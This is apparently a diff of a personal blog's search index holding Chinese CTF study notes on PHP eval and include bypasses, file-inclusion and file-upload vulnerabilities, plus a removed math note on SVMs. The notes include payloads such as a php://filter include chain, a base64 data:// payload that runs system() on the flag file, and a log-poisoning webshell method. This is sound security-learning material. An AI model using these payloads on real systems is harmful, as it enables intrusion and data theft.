+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="GET传参-eval执行"><a href="#GET传参-eval执行" class="headerlink" title="GET传参 eval执行"></a>GET传参 eval执行</h1><h3 id="使用通配符绕过"><a href="#使用通配符绕过" class="headerlink" title="使用通配符绕过"></a>使用通配符绕过</h3><p>前提是题目过滤的字符不多。直接使用system函数（或其他）执行命令，文件名使用通配符模糊搜索即可</p>
+<p>若过滤了system， 还可用反字节符配合echo。如echo `cat fla*`;</p>
+<h3 id="使用eval嵌套"><a href="#使用eval嵌套" class="headerlink" title="使用eval嵌套"></a>使用eval嵌套</h3><p>题目过滤了主要函数（cat， system），并且过滤了字符 <code>.</code></p>
+<p>这里需要使用到的字符有_  、[] 和 $</p>
+<h3 id="使用文件包含漏洞"><a href="#使用文件包含漏洞" class="headerlink" title="使用文件包含漏洞"></a>使用文件包含漏洞</h3><p>题目过滤了主要函数，并且过滤了符号 <code>.</code>  <code>&#39;</code>  ` <code>;</code>  <code>(</code>  <code>”</code>  <code>:</code> <code>&lt;</code> <code>=</code> <code>/</code>  和所有的数字</p>
+<p>首先将需要传入的参数c设置为include语句，再在include的文件中使用php协议读取内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>这里使用了?&gt;绕过 ;   </p>
+<p>也可以用data伪协议和日志注入</p>
+<h3 id="使用RCE绕过"><a href="#使用RCE绕过" class="headerlink" title="使用RCE绕过"></a>使用RCE绕过</h3><p>见下</p>
+<h1 id="GET传参-include执行"><a href="#GET传参-include执行" class="headerlink" title="GET传参 include执行"></a>GET传参 include执行</h1><h3 id="使用data伪协议"><a href="#使用data伪协议" class="headerlink" title="使用data伪协议"></a>使用data伪协议</h3><p>base64加密可以绕过flag，php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>[!NOTE]</p>
+<p>include中的拼接符没有任何作用。因为include中的文件在?&gt;就已经进行闭合了，后续的任何代码都不会再执行了，只会报错</p>
+</blockquote>
+<h3 id="使用RCE绕过-1"><a href="#使用RCE绕过-1" class="headerlink" title="使用RCE绕过"></a>使用RCE绕过</h3><p>过滤掉了除了 <code>()</code>  和 <code>;</code>以外所有符号，以及所有数字</p>
+<p>详见另一个笔记</p>
+<h1 id="POST传参-eval执行"><a href="#POST传参-eval执行" class="headerlink" title="POST传参 eval执行"></a>POST传参 eval执行</h1>]]></content>
+      <categories>
+        <category>计算机</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CTF-SHOW刷题记录Web3</title>
     <url>/2025/03/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="CTF-SHOW"><a href="#CTF-SHOW" class="headerlink" title="CTF SHOW"></a>CTF SHOW</h1><blockquote>
@@ -2131,37 +2237,6 @@
       </tags>
   </entry>
   <entry>
-    <title>CTF-SHOW刷题总结Web3</title>
-    <url>/2025/03/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="GET传参-eval执行"><a href="#GET传参-eval执行" class="headerlink" title="GET传参 eval执行"></a>GET传参 eval执行</h1><h3 id="使用通配符绕过"><a href="#使用通配符绕过" class="headerlink" title="使用通配符绕过"></a>使用通配符绕过</h3><p>前提是题目过滤的字符不多。直接使用system函数（或其他）执行命令，文件名使用通配符模糊搜索即可</p>
-<p>若过滤了system， 还可用反字节符配合echo。如echo `cat fla*`;</p>
-<h3 id="使用eval嵌套"><a href="#使用eval嵌套" class="headerlink" title="使用eval嵌套"></a>使用eval嵌套</h3><p>题目过滤了主要函数（cat， system），并且过滤了字符 <code>.</code></p>
-<p>这里需要使用到的字符有_  、[] 和 $</p>
-<h3 id="使用文件包含漏洞"><a href="#使用文件包含漏洞" class="headerlink" title="使用文件包含漏洞"></a>使用文件包含漏洞</h3><p>题目过滤了主要函数，并且过滤了符号 <code>.</code>  <code>&#39;</code>  ` <code>;</code>  <code>(</code>  <code>”</code>  <code>:</code> <code>&lt;</code> <code>=</code> <code>/</code>  和所有的数字</p>
-<p>首先将需要传入的参数c设置为include语句，再在include的文件中使用php协议读取内容。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-
-<p>这里使用了?&gt;绕过 ;   </p>
-<p>也可以用data伪协议和日志注入</p>
-<h3 id="使用RCE绕过"><a href="#使用RCE绕过" class="headerlink" title="使用RCE绕过"></a>使用RCE绕过</h3><p>见下</p>
-<h1 id="GET传参-include执行"><a href="#GET传参-include执行" class="headerlink" title="GET传参 include执行"></a>GET传参 include执行</h1><h3 id="使用data伪协议"><a href="#使用data伪协议" class="headerlink" title="使用data伪协议"></a>使用data伪协议</h3><p>base64加密可以绕过flag，php</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>[!NOTE]</p>
-<p>include中的拼接符没有任何作用。因为include中的文件在?&gt;就已经进行闭合了，后续的任何代码都不会再执行了，只会报错</p>
-</blockquote>
-<h3 id="使用RCE绕过-1"><a href="#使用RCE绕过-1" class="headerlink" title="使用RCE绕过"></a>使用RCE绕过</h3><p>过滤掉了除了 <code>()</code>  和 <code>;</code>以外所有符号，以及所有数字</p>
-<p>详见另一个笔记</p>
-<h1 id="POST传参-eval执行"><a href="#POST传参-eval执行" class="headerlink" title="POST传参 eval执行"></a>POST传参 eval执行</h1>]]></content>
-      <categories>
-        <category>计算机</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>通配符和正则表达式</title>
     <url>/2025/03/18/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E9%80%9A%E9%85%8D%E7%AC%A6%E4%B8%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="通配符与正则表达式"><a href="#通配符与正则表达式" class="headerlink" title="通配符与正则表达式"></a>通配符与正则表达式</h1><h2 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2><p>通配符是一种特殊语句，用来模糊搜索文件。</p>
@@ -2219,33 +2294,6 @@
 </tr>
 </tbody></table>
 <h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>正则表达式又称为规则表达式，用来检索、替换哪些符合某个模式（规则）的文本</p>
-]]></content>
-      <categories>
-        <category>计算机</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传漏洞</title>
-    <url>/2025/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的额能力。这种攻击方式是最为直接和有效的。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理，解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
-<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ol>
-<li>上传文件时Web语言脚本，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行</li>
-<li>上传文件是病毒或者木马时，主要用于诱骗用户或者管理员下载执行或者直接自动运行</li>
-<li>.上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);</li>
-<li>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。</li>
-<li>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。</li>
-</ol>
-<p> 除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块;或者上传一个合法的文本文件，其内容包含了PHP脚本，再通过”本地文件包含漏洞(Local File Include)”执行此脚本;等等。</p>
-<h2 id="满足条件"><a href="#满足条件" class="headerlink" title="满足条件"></a>满足条件</h2><ul>
-<li>上传的文件能够被Web容器解释执行。所以文件上传后的目录要是Web容器所覆盖到的路径</li>
-<li>用户能够从Web上访问这个文件。</li>
-<li>用户上传的文件要能绕过安全检查、格式化、图片压缩等等</li>
-</ul>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。</p>
-<p> 当系统存在文件上传漏洞时攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利。根据具体漏洞的差异，此处上传的脚本可以是正常后缀的PHP，ASP以及JSP脚本，也可以是篡改后缀后的这几类脚本。</p>
 ]]></content>
       <categories>
         <category>计算机</category>
@@ -2320,6 +2368,57 @@
 <p>然后查看源码即可</p>
 <h2 id="Web82"><a href="#Web82" class="headerlink" title="Web82"></a>Web82</h2><p>比起上道题多过滤了 <code>.</code> </p>
 <h3 id="SESSION条件竞争"><a href="#SESSION条件竞争" class="headerlink" title="SESSION条件竞争"></a>SESSION条件竞争</h3><p>待施工</p>
+]]></content>
+      <categories>
+        <category>计算机</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含漏洞</title>
+    <url>/2025/03/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>文件包含漏洞（FIle Inclusion Vulnerability）是指应用程序中存在的一种安全漏洞，攻击者通过利用漏洞可以在应用程序中执行任意代码。文件包含漏洞通常出现在动态网页中，攻击者通过在URL中注入恶意代码，使应用程序将恶意代码作为正常代码执行。</p>
+<p>通俗来讲，就是说开发人员开发程序的时候，每次都需要使用多个文件中的代码，很不方便。为了更方便一点，开发人员将被包含的文件设置成为一个变量，然后这样的话可以非常方便的调用这些文件。但是开发人员并没有限制用户是否也可以调用这些文件，这导致了攻击者会利用这个特征进行一些而已操作。注意这些文件包含本身没有漏洞，而是开发人员的疏忽而导致的漏洞。</p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
+<li><h5 id="include-等函数通过动态变量的方式引入包含文件"><a href="#include-等函数通过动态变量的方式引入包含文件" class="headerlink" title="include()等函数通过动态变量的方式引入包含文件"></a>include()等函数通过动态变量的方式引入包含文件</h5></li>
+</ol>
+<blockquote>
+<p>当使用include语句时，被包含的文件中的PHP代码会被执行，而其中的HTML或文本内容会直接输出到页面中</p>
+<p>如：eval(“include ‘php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php’;”);</p>
+<ol>
+<li><p>include会尝试包含处理后的文件流</p>
+</li>
+<li><p>由于返回的是base64编码的字符串，并非PHP代码</p>
+</li>
+<li><p>PHP会触发警告并将编码后的字符串作为文本输出</p>
+</li>
+</ol>
+</blockquote>
+<ol start="2">
+<li><h5 id="用户能够控制该动态变量"><a href="#用户能够控制该动态变量" class="headerlink" title="用户能够控制该动态变量"></a>用户能够控制该动态变量</h5></li>
+</ol>
+<h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><ol>
+<li><p>读取敏感文件</p>
+</li>
+<li><p>利用封装协议读源码</p>
+</li>
+<li><p>包含图片Getshell</p>
+</li>
+<li><p>截断包含</p>
+</li>
+<li><p>包含Apache日志Getshell</p>
+</li>
+</ol>
+<h2 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h2><p>Apache服务器运行后会生成两个日志文件，这两个文件是<code>access.log</code>（访问日志）和<code>error.log</code>（错误日志），apache的日志文件记录下我们的操作，并且写道访问日志文件access.log中</p>
+<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>通过日志文件getshell</p>
+<ol>
+<li>通过burpsuite发送的请求包产生日志数据</li>
+<li>包含日志文件</li>
+<li>写入一句话木马getshell</li>
+</ol>
+<p>使用代理工具抓包，在HTTP请求头中插入一句话木马，日志文件会将HTTP请求头的内容（包括其中的一句话木马）当作网站的访问记录保存，再次访问日志文件的时候，其中的一句话木马就会执行，然后就可以使用蚁剑等工具getshell了</p>
 ]]></content>
       <categories>
         <category>计算机</category>
@@ -2542,53 +2641,24 @@
       </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2025/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script>]]></content>
-  </entry>
-  <entry>
-    <title>文件包含漏洞</title>
-    <url>/2025/03/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>文件包含漏洞（FIle Inclusion Vulnerability）是指应用程序中存在的一种安全漏洞，攻击者通过利用漏洞可以在应用程序中执行任意代码。文件包含漏洞通常出现在动态网页中，攻击者通过在URL中注入恶意代码，使应用程序将恶意代码作为正常代码执行。</p>
-<p>通俗来讲，就是说开发人员开发程序的时候，每次都需要使用多个文件中的代码，很不方便。为了更方便一点，开发人员将被包含的文件设置成为一个变量，然后这样的话可以非常方便的调用这些文件。但是开发人员并没有限制用户是否也可以调用这些文件，这导致了攻击者会利用这个特征进行一些而已操作。注意这些文件包含本身没有漏洞，而是开发人员的疏忽而导致的漏洞。</p>
-<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol>
-<li><h5 id="include-等函数通过动态变量的方式引入包含文件"><a href="#include-等函数通过动态变量的方式引入包含文件" class="headerlink" title="include()等函数通过动态变量的方式引入包含文件"></a>include()等函数通过动态变量的方式引入包含文件</h5></li>
+    <title>文件上传漏洞</title>
+    <url>/2025/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的额能力。这种攻击方式是最为直接和有效的。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理，解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ol>
+<li>上传文件时Web语言脚本，服务器的Web容器解释并执行了用户上传的脚本，导致代码执行</li>
+<li>上传文件是病毒或者木马时，主要用于诱骗用户或者管理员下载执行或者直接自动运行</li>
+<li>.上传文件是Flash的策略文件crossdomain.xml，黑客用以控制Flash在该域下的行为(其他通过类似方式控制策略文件的情况类似);</li>
+<li>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行。</li>
+<li>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执行，被用于钓鱼和欺诈。</li>
 </ol>
-<blockquote>
-<p>当使用include语句时，被包含的文件中的PHP代码会被执行，而其中的HTML或文本内容会直接输出到页面中</p>
-<p>如：eval(“include ‘php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php’;”);</p>
-<ol>
-<li><p>include会尝试包含处理后的文件流</p>
-</li>
-<li><p>由于返回的是base64编码的字符串，并非PHP代码</p>
-</li>
-<li><p>PHP会触发警告并将编码后的字符串作为文本输出</p>
-</li>
-</ol>
-</blockquote>
-<ol start="2">
-<li><h5 id="用户能够控制该动态变量"><a href="#用户能够控制该动态变量" class="headerlink" title="用户能够控制该动态变量"></a>用户能够控制该动态变量</h5></li>
-</ol>
-<h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><ol>
-<li><p>读取敏感文件</p>
-</li>
-<li><p>利用封装协议读源码</p>
-</li>
-<li><p>包含图片Getshell</p>
-</li>
-<li><p>截断包含</p>
-</li>
-<li><p>包含Apache日志Getshell</p>
-</li>
-</ol>
-<h2 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h2><p>Apache服务器运行后会生成两个日志文件，这两个文件是<code>access.log</code>（访问日志）和<code>error.log</code>（错误日志），apache的日志文件记录下我们的操作，并且写道访问日志文件access.log中</p>
-<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>通过日志文件getshell</p>
-<ol>
-<li>通过burpsuite发送的请求包产生日志数据</li>
-<li>包含日志文件</li>
-<li>写入一句话木马getshell</li>
-</ol>
-<p>使用代理工具抓包，在HTTP请求头中插入一句话木马，日志文件会将HTTP请求头的内容（包括其中的一句话木马）当作网站的访问记录保存，再次访问日志文件的时候，其中的一句话木马就会执行，然后就可以使用蚁剑等工具getshell了</p>
+<p> 除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口，溢出服务器的后台处理程序，如图片解析模块;或者上传一个合法的文本文件，其内容包含了PHP脚本，再通过”本地文件包含漏洞(Local File Include)”执行此脚本;等等。</p>
+<h2 id="满足条件"><a href="#满足条件" class="headerlink" title="满足条件"></a>满足条件</h2><ul>
+<li>上传的文件能够被Web容器解释执行。所以文件上传后的目录要是Web容器所覆盖到的路径</li>
+<li>用户能够从Web上访问这个文件。</li>
+<li>用户上传的文件要能绕过安全检查、格式化、图片压缩等等</li>
+</ul>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>大部分的网站和应用系统都有上传功能，一些文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，导致允许攻击者向某个可通过Web访问的目录上传任意PHP文件，并能够将这些文件传递给PHP解释器，就可以在远程服务器上执行任意PHP脚本。</p>
+<p> 当系统存在文件上传漏洞时攻击者可以将病毒，木马，WebShell，其他恶意脚本或者是包含了脚本的图片上传到服务器，这些文件将对攻击者后续攻击提供便利。根据具体漏洞的差异，此处上传的脚本可以是正常后缀的PHP，ASP以及JSP脚本，也可以是篡改后缀后的这几类脚本。</p>
 ]]></content>
       <categories>
         <category>计算机</category>
@@ -2596,6 +2666,11 @@
       <tags>
         <tag>Web</tag>
       </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2025/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script>]]></content>
   </entry>
   <entry>
     <title>CTF-SHOW 刷题记录Web2</title>
@@ -2916,80 +2991,5 @@
 <p>GitHub <a href="https://github.com/yiyungent">@yiyungent</a> Gitee <a href="https://gitee.com/yiyungent">@yiyungent</a></p>
 </blockquote>
 ]]></content>
-  </entry>
-  <entry>
-    <title>支持向量机（SVM）</title>
-    <url>/2025/10/07/SVM/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="支持向量机"><a href="#支持向量机" class="headerlink" title="支持向量机"></a>支持向量机</h1><p>[toc]</p>
-<h3 id="数学基础补充"><a href="#数学基础补充" class="headerlink" title="数学基础补充"></a>数学基础补充</h3><h4 id="二元函数的无条件极值问题"><a href="#二元函数的无条件极值问题" class="headerlink" title="二元函数的无条件极值问题"></a>二元函数的无条件极值问题</h4><ol>
-<li>求偏导等于0，找到所有驻点（必要条件）</li>
-<li>求二阶偏导，依次确定各驻点处A、B、C的值，根据$$AC-B^2$$的符号判断是否为极值点（充分条件）<ol>
-<li>大于0，有极值。A&gt;0极小值，反之极大值</li>
-<li>小于0，没有极值</li>
-<li>等于0，可能有也可能没有</li>
-</ol>
-</li>
-</ol>
-<p>这通常对应一个<strong>最简单的无约束优化问题</strong></p>
-<h4 id="条件极值和拉格朗日乘数法"><a href="#条件极值和拉格朗日乘数法" class="headerlink" title="条件极值和拉格朗日乘数法"></a>条件极值和拉格朗日乘数法</h4><p>条件极值：对自变量有附加条件的极值</p>
-<p>设二元函数$$f(x,y)$$和$$\phi(x,y)$$在区域D内有一阶连续偏导数，则求$$z &#x3D; f(x,y)$$在D内满足条件$$\phi(x,y)$$的极值问题，可以转化为求拉格朗日函数<br>$$<br>L(x,y,\lambda) &#x3D; f(x,y) + \lambda\phi(x,y)~~~~~	(其中\lambda是某一常数)<br>$$<br>的无条件极值问题</p>
-<p>其中我们称一维向量$$\lambda_i$$是一个拉格朗日乘子</p>
-<p>这通常用于<strong>求解带有等式约束的优化问题</strong></p>
-<h4 id="数学符号说明"><a href="#数学符号说明" class="headerlink" title="数学符号说明"></a>数学符号说明</h4><h5 id="最大最小"><a href="#最大最小" class="headerlink" title="最大最小"></a>最大最小</h5><p>$$<br>g(\lambda) &#x3D; max_{x \in D}f(x,\lambda)<br>$$</p>
-<ul>
-<li>这是一个关于$$\lambda$$的函数</li>
-<li>当 $$\lambda &#x3D; y$$ 时，$$g(\lambda)$$ 的取值为： 固定 $$f(x,\lambda)$$ 中的 $$\lambda &#x3D; y $$ ，变动 x 时 f 能娶到的最大值</li>
-</ul>
-<p>$$<br>g(\lambda) &#x3D; max_\lambda ~min_x ~f(x,\lambda)<br>$$</p>
-<ul>
-<li>从右往左看，首先把min这一项看作关于$$\lambda$$ 的函数$$g(\lambda)$$ ，然后求这个函数的最大值</li>
-</ul>
-<h5 id="inf和sup符号"><a href="#inf和sup符号" class="headerlink" title="inf和sup符号"></a>inf和sup符号</h5><p>inf 是下确界，sup 上确界。和最大最小值相似但不同，max f 不存在的情况下 sup f 可能存在</p>
-<h5 id="凸函数凹函数"><a href="#凸函数凹函数" class="headerlink" title="凸函数凹函数"></a>凸函数凹函数</h5><p>使用国内定义还是国际定义仁者见仁智者见智了（<strong>以下使用国际定义</strong>）</p>
-<p>但是要记得詹森不等式<br>$$<br>凸函数：和的函数值 \le 函数值的和 \<br>凹函数：和的函数值 \ge 函数值的和<br>$$<br><a href="https://wetts.github.io/2019/09/11/%E6%95%B0%E5%AD%A6/%E5%85%B6%E4%BB%96/%E4%BB%BF%E5%B0%84%E5%87%BD%E6%95%B0%E5%92%8C%E7%BA%BF%E6%80%A7%E5%87%BD%E6%95%B0/">仿射函数</a>是又凹又凸的</p>
-<p>max是凹函数、min是凸函数（利用詹森不等式证明）</p>
-<h4 id="拉格朗日对偶问题"><a href="#拉格朗日对偶问题" class="headerlink" title="拉格朗日对偶问题"></a>拉格朗日对偶问题</h4><h5 id="原问题"><a href="#原问题" class="headerlink" title="原问题"></a>原问题</h5><p>$$<br>\begin{aligned}<br>	\min_{\mathbf{x}\in \mathbb{R} ^{\mathtt{n}}} \mathbf{f}\left( \mathbf{x} \right)\<br>	\mathbf{s}.\mathbf{t}\quad \mathbf{c}<em>{\mathtt{i}}\left( \mathbf{x} \right) &amp;\leqslant \mathbf{0},\mathbf{i}\in \left[ \mathtt{1},\mathtt{k} \right]\<br>	\quad \quad \mathtt{h}</em>{\mathtt{j}}\left( \mathbf{x} \right) &amp;&#x3D;\mathbf{0},\mathbf{j}\in \left[ \mathtt{1},\mathbf{l} \right]\<br>\end{aligned}<br>$$</p>
-<p><a href="https://zh.wikipedia.org/wiki/%E5%87%B8%E5%84%AA%E5%8C%96">凸优化</a> 要求$$f(x)$$ 是凸函数， $$c_i(x)$$ 是凸函数， $$h_j(x)$$ 是仿射函数</p>
-<p>但这里我们做两个约定</p>
-<ul>
-<li>我们不假定原函数 f 的凹凸性， f 既可以是凹函数也可以是凸函数</li>
-<li>问题的定义域 $$\mathrm{D}&#x3D;(\mathrm{dom} \mathrm{f)}\cap (\bigcap\nolimits_{\mathrm{i}&#x3D;1}^{\mathrm{k}}{\mathrm{c}<em>{\mathrm{i}})}\cap (\bigcap\nolimits</em>{\mathrm{i}&#x3D;1}^{\mathrm{l}}{\mathrm{h}_{\mathrm{i}})}$$</li>
-<li>D 不是 空集</li>
-<li>我们约定最终求出来的最优结果用$$p^*$$表示</li>
-</ul>
-<h5 id="对偶问题"><a href="#对偶问题" class="headerlink" title="对偶问题"></a>对偶问题</h5><p>定义：实质相同但从不同角度提出不同提法的一对问题。</p>
-<p>在原问题中, 约束条件太多，并且凹凸性不明确。 于是我们将他转化为拉格朗日对偶问题。这样的有点是：只有一个约束，并且拉格朗日对偶问题一定是凹的。</p>
-<p>证明如下：</p>
-<ol>
-<li>类比于等式约束的最值问题，我们为原问题构建一个广义拉格朗日函数</li>
-</ol>
-<p>$$<br>\begin{aligned}<br>	\mathcal{L} :\mathbb{R} ^{\mathtt{n}}\times \mathbb{R} ^{\Bbbk}\times \mathbb{R} ^{\mathrm{l}}\rightarrow \mathrm{R}\<br>	\mathcal{L} (\mathtt{x},\mathrm{\lambda},\mathrm{\mu)}&amp;&#x3D;\mathtt{f}(\mathtt{x})+\sum_{\mathrm{i}&#x3D;1}^{\mathrm{k}}{\lambda <em>{\mathrm{i}}\mathrm{c}</em>{\mathrm{i}}(\mathtt{x})}+\sum_{\mathrm{j}&#x3D;1}^{\mathrm{l}}{\mathrm{\mu}<em>{\mathrm{j}}\mathrm{h}</em>{\mathrm{j}}(\mathtt{x})}\<br>	\vec{\mathtt{x}}\in \mathbb{R} ^{\mathtt{n}},\vec{\lambda}\in \mathbb{R} ^{\Bbbk},\vec{\mathrm{\mu}}\in \mathbb{R} ^{\mathrm{l}}\<br>\end{aligned}<br>$$</p>
-<ol start="2">
-<li>根据 L 我们定义一个拉格朗日对偶函数 g(lambda, mu)</li>
-</ol>
